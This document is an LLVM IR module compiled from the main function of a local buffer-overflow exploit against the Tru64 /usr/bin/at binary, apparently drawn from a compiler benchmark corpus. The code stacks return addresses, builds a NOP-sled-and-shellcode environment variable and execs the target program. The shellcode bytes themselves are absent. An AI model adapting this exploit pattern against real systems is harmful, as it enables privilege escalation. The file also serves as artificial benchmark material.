; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/tru64/local/extr_281.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/tru64/local/extr_281.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DBUF = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@ALLIGN = common dso_local global i32 0, align 4
@NOP = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [6 x i8] c"ATEX=\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"Return address %#x, offset: %d.\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"/usr/bin/at\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"at\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @DBUF, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %6, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %7, align 8
  %19 = load i32, i32* @DBUF, align 4
  %20 = add nsw i32 %19, 1
  %21 = zext i32 %20 to i64
  %22 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %9, align 8
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @usage(i8* %28)
  br label %30

30:                                               ; preds = %25, %2
  %31 = load i32, i32* %4, align 4
  %32 = icmp sgt i32 %31, 1
  br i1 %32, label %33, label %38

33:                                               ; preds = %30
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atoi(i8* %36)
  store i32 %37, i32* %12, align 4
  br label %40

38:                                               ; preds = %30
  %39 = load i32, i32* @OFFSET, align 4
  store i32 %39, i32* %12, align 4
  br label %40

40:                                               ; preds = %38, %33
  %41 = load i32, i32* %4, align 4
  %42 = icmp sgt i32 %41, 2
  br i1 %42, label %43, label %48

43:                                               ; preds = %40
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 2
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @atoi(i8* %46)
  store i32 %47, i32* %13, align 4
  br label %50

48:                                               ; preds = %40
  %49 = load i32, i32* @ALLIGN, align 4
  store i32 %49, i32* %13, align 4
  br label %50

50:                                               ; preds = %48, %43
  %51 = load i32, i32* %11, align 4
  %52 = load i32, i32* %12, align 4
  %53 = sub nsw i32 0, %52
  %54 = and i32 %51, %53
  %55 = sext i32 %54 to i64
  store i64 %55, i64* %14, align 8
  %56 = load i32, i32* %13, align 4
  %57 = icmp sgt i32 %56, 0
  br i1 %57, label %58, label %71

58:                                               ; preds = %50
  store i32 0, i32* %11, align 4
  br label %59

59:                                               ; preds = %67, %58
  %60 = load i32, i32* %11, align 4
  %61 = load i32, i32* @DBUF, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %70

63:                                               ; preds = %59
  %64 = load i32, i32* %11, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %18, i64 %65
  store i8 105, i8* %66, align 1
  br label %67

67:                                               ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %11, align 4
  br label %59

70:                                               ; preds = %59
  br label %71

71:                                               ; preds = %70, %50
  %72 = load i32, i32* %13, align 4
  store i32 %72, i32* %11, align 4
  br label %73

73:                                               ; preds = %83, %71
  %74 = load i32, i32* %11, align 4
  %75 = load i32, i32* @DBUF, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %86

77:                                               ; preds = %73
  %78 = load i64, i64* %14, align 8
  %79 = load i32, i32* %11, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %18, i64 %80
  %82 = bitcast i8* %81 to i64*
  store i64 %78, i64* %82, align 1
  br label %83

83:                                               ; preds = %77
  %84 = load i32, i32* %11, align 4
  %85 = add nsw i32 %84, 4
  store i32 %85, i32* %11, align 4
  br label %73

86:                                               ; preds = %73
  %87 = load i8*, i8** @NOP, align 8
  store i8* %87, i8** %10, align 8
  store i32 0, i32* %11, align 4
  br label %88

88:                                               ; preds = %112, %86
  %89 = load i32, i32* %11, align 4
  %90 = load i8*, i8** @shellcode, align 8
  %91 = call i32 @strlen(i8* %90)
  %92 = sub nsw i32 4096, %91
  %93 = call i32 @strlen(i8* %18)
  %94 = sub nsw i32 %92, %93
  %95 = icmp slt i32 %89, %94
  br i1 %95, label %96, label %115

96:                                               ; preds = %88
  %97 = load i32, i32* %11, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 %98
  store i8 31, i8* %99, align 1
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 %102
  store i8 4, i8* %103, align 1
  %104 = load i32, i32* %11, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 %106
  store i8 -1, i8* %107, align 1
  %108 = load i32, i32* %11, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %11, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 %110
  store i8 71, i8* %111, align 1
  br label %112

112:                                              ; preds = %96
  %113 = load i32, i32* %11, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %11, align 4
  br label %88

115:                                              ; preds = %88
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = load i8*, i8** @shellcode, align 8
  %121 = load i8*, i8** @shellcode, align 8
  %122 = call i32 @strlen(i8* %121)
  %123 = call i32 @memcpy(i8* %119, i8* %120, i32 %122)
  %124 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %125 = call i32 @memcpy(i8* %124, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i32 5)
  %126 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %127 = call i32 @putenv(i8* %126)
  %128 = load i32, i32* @stderr, align 4
  %129 = load i64, i64* %14, align 8
  %130 = load i32, i32* %12, align 4
  %131 = call i32 @fprintf(i32 %128, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i64 %129, i32 %130)
  %132 = call i32 @execlp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %18, i32 0)
  %133 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %133)
  %134 = load i32, i32* %3, align 4
  ret i32 %134
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, i64, i32) #2

declare dso_local i32 @execlp(i8*, i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
